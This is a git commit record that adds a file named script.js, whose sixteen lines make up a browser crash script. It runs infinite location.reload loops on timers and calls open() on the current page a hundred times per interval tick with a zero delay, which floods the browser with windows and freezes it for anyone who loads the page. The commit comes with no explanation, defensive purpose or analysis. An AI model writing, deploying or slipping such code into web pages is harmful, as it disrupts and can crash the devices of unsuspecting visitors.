5165d24282933177ec0555384db956b72a6e8832
Algebra-Is-Fun <xpixelcoderxqa@gmail.com>
2025-05-08 19:31:22 -0400

    Create script.js

---
+++ script.js
@@ -0,0 +1,16 @@
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
